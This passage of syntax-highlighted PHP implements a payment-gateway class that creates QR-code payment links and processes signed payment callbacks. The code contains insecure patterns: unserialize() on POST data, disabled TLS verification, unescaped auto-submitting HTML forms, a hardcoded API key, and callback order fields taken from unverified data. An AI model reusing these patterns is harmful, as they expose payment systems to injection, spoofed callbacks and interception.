class="variable">$resultData</span>[<span class="string">&#x27;r6_qrcode&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = D(<span class="string">&#x27;accountRecharge&#x27;</span>)-&gt;getOneCoupon(<span class="string">&#x27;id&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;order_sn&#x27;</span> =&gt; <span class="variable">$retOderNo</span>, <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219004</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;支付二维码生成失败！&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;返回数据成功,但订单表没有查到相应未完成的订单号，&#x27;</span> . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        D(<span class="string">&#x27;accountRecharge&#x27;</span>)-&gt;save([<span class="string">&#x27;remark&#x27;</span> =&gt; <span class="variable">$retOderPayNo</span>], [<span class="string">&#x27;order_sn&#x27;</span> =&gt; <span class="variable">$retOderNo</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用于安全验证返回url是否非法</span></span><br><span class="line">        <span class="variable">$shortQrcodrUrl</span> =<span class="keyword">$this</span>-&gt;shortUrl(<span class="variable">$retOderPayQrcodrUrl</span>, <span class="string">&#x27;5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$shortQrcodrUrl</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219005</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;支付二维码生成失败！&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;二维码获取成功，但转换短链接失败&#x27;</span> . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        session::set(<span class="string">&#x27;qrcode_url&#x27;</span>, <span class="variable">$shortQrcodrUrl</span>);</span><br><span class="line">        session::set(<span class="string">&#x27;pay_url&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//type =1 返回二维码数据</span></span><br><span class="line">        <span class="variable">$ret</span> =  [</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>     =&gt; <span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;request_type&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;code_url&#x27;</span> =&gt; <span class="variable">$shortQrcodrUrl</span>,</span><br><span class="line">            <span class="string">&#x27;pay_url&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order_no&#x27;</span> =&gt; <span class="variable">$orderInfo</span>,</span><br><span class="line">            <span class="string">&#x27;modes&#x27;</span>    =&gt; <span class="variable">$data</span>[<span class="string">&#x27;pay_model&#x27;</span>]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 支付回调处理</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $postData data：回调返回的数据，payment_Id：支付类型ID</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> PayInfo::doPaycallBack()</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array $this-&gt;$retArr;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doPaycallBack</span>(<span class="params"><span class="variable">$postData</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//接收回调后 返回 ok;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//处理post回调数据</span></span><br><span class="line">        <span class="variable">$data</span>       = json_decode(<span class="variable">$postData</span>[<span class="string">&#x27;data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$reqdata</span>    = <span class="variable">$data</span>[<span class="string">&#x27;reqdata&#x27;</span>];</span><br><span class="line">        <span class="variable">$config</span>     = unserialize(<span class="variable">$postData</span>[<span class="string">&#x27;config&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        payLog(<span class="string">&#x27;chengyi.txt&#x27;</span>,print_r(<span class="variable">$postData</span>, <span class="literal">true</span>).<span class="string">&#x27;----996--&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断字符串是否需要 urldecode解</span></span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$reqdata</span>, <span class="string">&#x27;%&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$reqdata</span> =  urldecode(<span class="variable">$reqdata</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$config</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219020</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）支付异步通知,获取数据库配置错误！&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$reqdata</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219021</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）支付异步通知:获取重要参数错误！&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取私钥</span></span><br><span class="line">        <span class="variable">$private_key</span> = <span class="keyword">$this</span>-&gt;privateKeyStr(<span class="variable">$config</span>[<span class="string">&#x27;merchantPrivateKey&#x27;</span>]);</span><br><span class="line">        <span class="comment">//解密</span></span><br><span class="line">        <span class="variable">$dataJson</span>    = <span class="keyword">$this</span>-&gt;privateDecrypt(<span class="variable">$reqdata</span>, <span class="variable">$private_key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$dataJson</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219022</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）支付异步通知：支付解密失败！&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = json_decode(<span class="variable">$dataJson</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;partner&#x27;</span>] = <span class="variable">$config</span>[<span class="string">&#x27;merchantID&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//去除不需要参入验签的字段</span></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="string">&quot;sysnumber&quot;</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="string">&quot;attach&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//验证签名</span></span><br><span class="line">        <span class="variable">$re</span> = <span class="keyword">$this</span>-&gt;payVerify(<span class="variable">$arr</span>, <span class="variable">$config</span>[<span class="string">&#x27;merchantKey&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219023</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）支付异步通知：验签失败！&#x27;</span>  . print_r(<span class="variable">$arr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;orderstatus&#x27;</span>]) || <span class="variable">$arr</span>[<span class="string">&#x27;orderstatus&#x27;</span>] != <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219024</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）支付异步通知：支付失败！&#x27;</span>  . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;code&#x27;</span>]  = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;order_no&#x27;</span>]  = <span class="variable">$data</span>[<span class="string">&#x27;ordernumber&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;amount&#x27;</span>]    = <span class="variable">$data</span>[<span class="string">&#x27;paymoney&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderInfo[<span class="string">&#x27;serial_no&#x27;</span>] = <span class="variable">$data</span>[<span class="string">&#x27;sysnumber&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [get_sign 拼接签名字符串]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $arr 数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]      [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">get_sign</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="variable">$signmd5</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$signmd5</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">				<span class="variable">$signmd5</span> =<span class="variable">$signmd5</span>.<span class="variable">$x</span> .<span class="string">&#x27;=&#x27;</span>. <span class="variable">$x_value</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$signmd5</span> = <span class="variable">$signmd5</span>.<span class="string">&#x27;&amp;&#x27;</span>.<span class="variable">$x</span> .<span class="string">&#x27;=&#x27;</span>. <span class="variable">$x_value</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$signmd5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [publicKeyStr 公钥字符串处理]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $publicStr 公钥字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]            [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>   <span class="function"><span class="keyword">function</span> <span class="title">publicKeyStr</span>(<span class="params"><span class="variable">$publicStr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$public_key</span> = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (str_split(<span class="variable">$publicStr</span>,<span class="number">64</span>) <span class="keyword">as</span> <span class="variable">$str</span>)&#123;</span><br><span class="line">            <span class="variable">$public_key</span> .= <span class="variable">$str</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$public_key</span> .=<span class="string">&quot;-----END PUBLIC KEY-----&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * [publicEncrypt 公钥加密]</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@param</span>  [type] $publicKey 公钥</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@param</span>  [type] $data      加密字符串</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@return</span> [type]            [description]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">publicEncrypt</span>(<span class="params"><span class="variable">$publicKey</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = openssl_get_publickey(<span class="variable">$publicKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$original_arr</span> = str_split(<span class="variable">$data</span>,<span class="number">117</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$original_arr</span> <span class="keyword">as</span> <span class="variable">$o</span>) &#123;</span><br><span class="line">            <span class="variable">$sub_enc</span> = <span class="literal">null</span>;</span><br><span class="line">            openssl_public_encrypt(<span class="variable">$o</span>,<span class="variable">$sub_enc</span>,<span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$original_enc_arr</span>[] = <span class="variable">$sub_enc</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        openssl_free_key(<span class="variable">$key</span>);</span><br><span class="line">        <span class="variable">$original_enc_str</span> = base64_encode(implode(<span class="string">&#x27;&#x27;</span>,<span class="variable">$original_enc_arr</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$original_enc_str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [paramToHtmlForm form表单方法]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $url    请求URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $params 数组 请求参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]         [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">paramToHtmlForm</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$params</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$def_url</span> = <span class="string">&quot;&lt;form id=&#x27;form&#x27; name=&#x27;payForm&#x27; action=&#x27;&quot;</span>.<span class="variable">$url</span>.<span class="string">&quot;&#x27; method=&#x27;POST&#x27;&gt;\r&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$def_url</span> .=<span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;&#x27; value=&#x27;&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&#x27;&gt;\r&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$def_url</span> .=<span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;确认提交&#x27;&gt;&lt;/form&gt;&lt;script language=&#x27;javascript&#x27;&gt;window.onload=function()&#123;document.payForm.submit();&#125;&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$def_url</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [httpRequest http请求]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $url  请求URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $data 请求参数 json字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]       [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">httpRequest</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>,<span class="string">&#x27;Content-Length: &#x27;</span> . strlen(<span class="variable">$data</span>)));</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$tmpInfo</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (curl_errno(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> curl_error(<span class="variable">$ch</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$tmpInfo</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *[payVerify 支付付验签]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $result [返回的参数]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type] $md5    [MD5]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">payVerify</span>(<span class="params"><span class="variable">$result</span>,<span class="variable">$md5</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$signStr</span> = <span class="variable">$result</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">        <span class="variable">$sign_array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&#x27;sign&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$sign_array</span>[<span class="variable">$k</span>] = <span class="variable">$v</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sign</span>  = md5(<span class="keyword">$this</span>-&gt;get_sign(<span class="variable">$sign_array</span>).<span class="variable">$md5</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$signStr</span> != <span class="variable">$sign</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">CurlQuery</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//设置附加HTTP头</span></span><br><span class="line">        <span class="variable">$addHead</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Content-type: application/json&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$curl_obj</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_HTTPHEADER, <span class="variable">$addHead</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_TIMEOUT, <span class="number">15</span>);</span><br><span class="line">        <span class="variable">$result</span> = curl_exec(<span class="variable">$curl_obj</span>);</span><br><span class="line">        curl_close(<span class="variable">$curl_obj</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据长网址获取短网址</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shortUrl</span>(<span class="params"><span class="variable">$long_url</span>, <span class="variable">$appkey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long_url</span> = urlencode(<span class="variable">$long_url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&#x27;http://mrw.so/api.php?format=json&amp;url=&#x27;</span> . <span class="variable">$long_url</span> . <span class="string">&#x27;&amp;key=&#x27;</span> . <span class="variable">$appkey</span> . <span class="string">&#x27;&amp;expireDate=&#x27;</span> . date(<span class="string">&quot;Y-m-d&quot;</span>,strtotime(<span class="string">&quot;+3 day&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取请求结果</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;CurlQuery(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$json</span> = json_decode(<span class="variable">$result</span>);</span><br><span class="line">        <span class="comment">//异常情况返回false</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$json</span>-&gt;err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$json</span>-&gt;url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提交表单数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $post_data 表单提交数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url 表单提交接口</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">httpHtml</span>(<span class="params"><span class="variable">$post_data</span>, <span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&#x27;&lt;html&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&#x27;&lt;head&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/head&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;body onLoad=&quot;document.dinpayForm.submit();&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;form id=&quot;payFrom&quot; name=&quot;dinpayForm&quot; method=&quot;get&quot; action=&quot;&#x27;</span> . <span class="variable">$url</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$post_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;&quot; value=&quot;&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/body&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/html&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 调用第三方接口，提交数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url 第三方接口url</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $postdata 提交数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array[]|mixed[] 返回数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">httpPost</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$url</span>, <span class="variable">$path</span>=<span 